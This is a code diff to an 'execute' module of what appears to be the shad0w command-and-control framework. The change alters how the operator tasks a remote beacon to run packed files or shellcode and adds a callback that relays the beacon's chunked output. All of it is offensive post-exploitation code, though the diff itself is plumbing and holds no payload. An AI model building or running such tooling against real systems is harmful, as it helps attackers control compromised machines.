@@ -12,12 +12,23 @@ __author__ = "@_batsec_"
 # identify the task as shellcode execute
 from lib.basecommand import BaseCommand
 
+# beacon to exec command on
+current_beacon = None
+
 USERCD_EXEC_ID = 0x3000
 
+def execute_callback(shad0w, data):
+    # wont be hit
+
+    shad0w.event.beacon_info(current_beacon, data)
+
+    return ""
 
 class ExecuteCommand(BaseCommand):
-    def __init__(self, args):
+    def __init__(self, args, beacon):
         BaseCommand.__init__(self, "execute", args)
+
+        self.beacon = beacon
 
     def get_usage(self):
         return """
@@ -45,11 +56,11 @@ execute -f msg.js
     def run(self, shad0w):
         # give a message to the user
         if self.args.param is None:
-            shad0w.debug.log(f"Executing: {''.join(self.args.file)}", log=True)
+            shad0w.event.beacon_info(current_beacon, f"Executing: {''.join(self.args.file)}")
             file = ''.join(self.args.file)
             params = None
         else:
-            shad0w.debug.log(f"Executing: \"{''.join(self.args.file)} {' '.join(self.args.param)}\"", log=True)
+            shad0w.event.beacon_info(current_beacon, f"Executing: \"{''.join(self.args.file)} {' '.join(self.args.param)}\"")
             file = ''.join(self.args.file)
             params = ' '.join(self.args.param)
 
@@ -70,20 +81,20 @@ execute -f msg.js
         os.chdir(b4dir)
 
         # set a task for the current beacon to do
-        shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
-
-        # inform the user of the change
-        shad0w.debug.log(f"Tasked beacon ({shad0w.current_beacon})", log=True)
+        shad0w.beacons[self.beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
+        shad0w.beacons[self.beacon]["callback"] = execute_callback
 
 
-def main(shad0w, args):
+def main(shad0w, args, beacon):
+    global current_beacon
 
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
+    # make beacon global
+    current_beacon = beacon
 
-    cmd = ExecuteCommand(args)
+    # dont clear the callbacks, cause the reponse are chunked
+    shad0w.clear_callbacks = False
+
+    cmd = ExecuteCommand(args, beacon)
     if cmd.parse() is not False:
         cmd.run(shad0w)
 
